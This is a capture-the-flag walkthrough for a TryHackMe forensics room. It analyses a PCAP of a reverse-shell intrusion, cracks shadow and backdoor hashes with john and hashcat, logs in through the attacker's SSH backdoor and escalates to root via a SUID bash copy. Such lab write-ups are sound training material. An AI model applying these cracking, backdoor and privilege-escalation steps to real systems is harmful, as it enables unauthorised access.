# Forensics - Analyse the PCAP 
download pcap file and open it with wireshark:
1. What was the URL of the page they used to upload a reverse shell?

Upload something on web -> HTTP **POST** request. Check for post request to find the anwser.

2. What payload did the attacker use to gain access?

You can use wireshark to export object including files such as .txt .zip and .php. In this case we will export reverse shell that the attacker uploaded onto Overpass server.


In wireshark. Go to File -> Export Objects -> HTTP and select packet 14 which is the packet that include the reverse shell.

![upload.php](../pic/Screenshot%202020-08-19%20at%2015.47.18.png)

save the flie, open it with ur fav text editor and grab the payload.

1. What password did the attacker use to privesc?

From the last task we know that the reverse shell will connect back to port number 4242. Let start with filter out unnecessary packet by search for `tcp.port == 4242`


Note that the reverse shell is establised between attacker's port **4242** and victim's port **57680**. let imporve our search a bit: `tcp.port == 4242 || tcp.port == 57680`. We can now see the flow reverse shell tracffic. Take your time and try to understand it.


At some point, The attacker try to log into James account by executing `su james`. As we already know, you will need to enter user's password after executing the mentioned command. Find out what James's password

**Hint**:
<details>follow tcp stream</details>

4. How did the attacker establish persistence?

check the tcp stream and you will find out
5. Using the fasttrack wordlist, how many of the system passwords were crackable?

copy `/etc/shadow` to ur kali. now run john to crack it using `/usr/share/wordlists/fasttrack.txt`

```console
kali@kali:~/THM/Overpass$ sudo john -wordlist=/usr/share/wordlists/fasttrack.txt shadow.txt
kali@kali:~/THM/Overpass$ sudo john --show shadow.txt # check cracked password
```

# Research - Analyse the code 
clone backdoor from github by executing `git clone https://github.com/NinjaJc01/ssh-backdoor`
1.  What's the default hash for the backdoor? 

check for `hash` in `main.go`

2. What's the hardcoded salt for the backdoor?

check function `passwordHandler`

3. What was the hash that the attacker used? - go back to the PCAP for this!

go back to wireshark and check tcp stream. when the attacker execute `backdoor`
4. Crack the hash using rockyou and a cracking tool of your choice. What's the password?

use [hash identifier](https://www.onlinehashcrack.com/hash-identification.php) to indentify the hash. We will use hashcat to crack the hash. check hashcat [example hash](https://hashcat.net/wiki/doku.php?id=example_hashes) to find out which the hash+salt format for hash type we got from hash identifier.

```console
$ hashcat -m <operation mode> -a 0 -o crack.txt 'passwordhash:salt' /usr/share/wordlists/rockyou.txt --force
```
# Attack - Get back in! 

From `main.go` we know that:
1. the backdoor is run as over `ssh`
2. run on port 2222
3. password to blackdoor

so what are we waiting for? just ssh `into` it
```console
kali@kali:~/THM/Overpass$ ssh $IP -p 2222
james@overpass-production:/home/james/ssh-backdoor$ cd ..
james@overpass-production:/home/james$ ls
ssh-backdoor  user.txt  www
```
grab user flag !!

I try to run `sudo -l` using the james's password which we recived from .pcap file before. It didnt work, Seem like the attacker changed it. Next step is looking for `SUID`, if you dont know what `SUID` is, pls do some research by youself. Anyway, I use suid3num.py to enumerate `SUID`. You can find the tool on github [link](https://github.com/Anon-Exploiter/SUID3NUM). Tranfer the script to victim server and run it
```
[~] Custom SUID Binaries (Interesting Stuff)
------------------------------
/home/james/.suid_bash
------------------------------
```
let investigate `.suid_bash`

```console
james@overpass-production:/home/james$ file .suid_bash 
.suid_bash: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=12f73d7a8e226c663034529c8dd20efec22dde54, stripped
james@overpass-production:/home/james$ ./.suid_bash 
.suid_bash-4.4$ whoami
james
```
seem like the script is a binary file which spawn a bash shell when u run it. I wonder if it just a normalt bash shell but with suid like the name of script. let check out
```console
james@overpass-production:/home/james$ ./.suid_bash -help
GNU bash, version 4.4.20(1)-release-(x86_64-pc-linux-gnu)
Usage:	./.suid_bash [GNU long option] [option] ...
	./.suid_bash [GNU long option] [option] script-file ...
GNU long options:
	--debug
	--debugger
	--dump-po-strings
```
Bing Go!! it is just a copy/paste of `/bin/bash` but it is a suid file. Try to run `bash -help`, you will get the same output. so let check [GTFOBINs](https://gtfobins.github.io/gtfobins/bash/#suid). focus on `#suid` read and observe !


now let exlpoit it by run `-p`
```console
james@overpass-production:/home/james$ ./.suid_bash -p
.suid_bash-4.4# whoami
root
```

no go grab root flag.


I really enjoyed this room, if you dont know what to do next pls check room created by [NinjaJc01](https://tryhackme.com/p/NinjaJc01). I rooted many of his room and alway enjoy it.
